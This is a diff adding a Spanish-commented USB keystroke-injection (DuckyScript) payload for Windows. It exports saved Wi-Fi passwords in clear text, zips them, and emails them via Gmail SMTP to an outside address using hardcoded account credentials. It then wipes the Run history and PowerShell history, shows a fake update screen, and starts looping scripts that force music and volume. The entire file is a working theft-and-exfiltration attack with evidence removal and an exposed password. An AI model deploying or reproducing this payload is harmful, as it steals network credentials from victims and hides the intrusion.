@@ -1,0 +1,130 @@
+REM --> Abrir terminal
+DELAY 20000
+GUI d
+DELAY 150
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 500
+STRING color FE & mode con:cols=18 lines=100
+ENTER
+REM --> Ir al escritorio y crear un carpeta
+STRING cd Desktop
+ENTER
+STRING mkdir Contras
+ENTER
+STRING cd Contras
+ENTER
+STRING netsh wlan export profile key=clear 
+ENTER
+DELAY 200
+STRING cd ..
+ENTER
+STRING powershell
+ENTER
+STRING Compress-Archive -Path Contras -DestinationPath Contras.zip
+ENTER
+REM --> Realizar el reporte de las contraseñas
+REM --> Desactivar seguridad de la cuenta https://myaccount.google.com/lesssecureapps
+DELAY 500
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('joal.import.export@gmail.com', 'cuentajoal11')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'joal.import.export@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('samm3488@gmail.com')
+ENTER
+STRING $ReportEmail.Subject = "Psss"
+ENTER
+STRING $ReportEmail.Body = "Ok"
+ENTER
+STRING $ReportEmail.Attachments.Add("Contras.zip")
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 400
+REM --> Limpiar todo
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+STRING cd ..
+ENTER
+STRING cd AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+ENTER
+STRING del ConsoleHost_history.txt
+ENTER
+STRING exit
+ENTER
+DELAY 100
+STRING del Contras & rmdir Contras
+ENTER
+STRING S
+ENTER
+STRING del Contras.zip & exit
+ENTER
+DELAY 3000
+GUI r
+DELAY 500
+REM --> Pantalla fake de actualización
+STRING iexplore -k http://fakeupdate.net/win10/index.html
+ENTER
+DELAY 3500
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+STRING del %tmp%\rickyou.vbs
+ENTER
+DELAY 200
+STRING del %tmp%\volup.vbs
+ENTER
+DELAY 200
+STRING cd %tmp% && copy con rickyou.vbs
+ENTER
+STRING While true
+ENTER
+STRING Dim oPlayer
+ENTER
+STRING Set oPlayer = CreateObject("WMPlayer.OCX")
+ENTER
+STRING oPlayer.URL = "https://www.youtube.com/watch?v=l_lblj8Cq0o&list=RDl_lblj8Cq0o&start_radio=1"
+ENTER
+STRING oPlayer.controls.play
+ENTER
+STRING While oPlayer.playState <> 1 ' 1 = Stopped
+ENTER
+STRING WScript.Sleep 100
+ENTER
+STRING Wend
+ENTER
+STRING oPlayer.close
+ENTER
+STRING Wend
+ENTER
+DELAY 100
+CTRL z
+ENTER
+STRING copy con volup.vbs
+ENTER
+STRING do
+ENTER
+STRING Set WshShell = CreateObject("WScript.Shell")
+ENTER
+STRING WshShell.SendKeys(chr(&hAF))
+ENTER
+STRING loop
+ENTER
+CTRL z
+ENTER
+STRING start rickyou.vbs && volup.vbs
+ENTER
+STRING exit
+ENTER
